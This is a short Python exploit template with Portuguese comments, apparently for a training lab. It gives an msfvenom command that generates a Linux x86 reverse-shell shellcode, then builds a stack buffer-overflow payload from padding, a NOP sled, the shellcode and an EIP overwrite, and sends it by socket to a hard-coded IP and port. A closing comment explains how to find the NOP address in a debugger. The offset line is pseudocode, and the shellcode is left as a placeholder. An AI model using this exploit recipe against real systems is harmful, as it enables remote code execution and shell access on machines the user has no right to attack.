#crie um exploit com o seguinte comando
# msfvenom -p linux/x86/shell_reverse_tcp lhost=<ip da sus maquina onde recebera a conexao> lport=1234 --format c --arch x86 --plataform linux --bad-chars "<caracteres ruins>" --out shellcode
# em seguida descubra o endereco nop rodando o script

import socket

IP = "10.129.43.23" #altere o ip para o alvo ou local
port = 21449 #altere a porta para o servico


def exploit():
    

    buf =  "<inisira aqui o exploit criado>"

    offset = valor do eip - 124 - tamanho do exploit - 4
    buffer = b"A" * offset
    nop = b"\x90" * 124
    eip = b"B" * 4
    payload = buffer + nop + buf + eip

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()
exploit()

#execute o seguinte comando no xdbg e pegue qualquer endereco onde foram registrados os bytes x90
# x/<valor do eip> $esp+2000
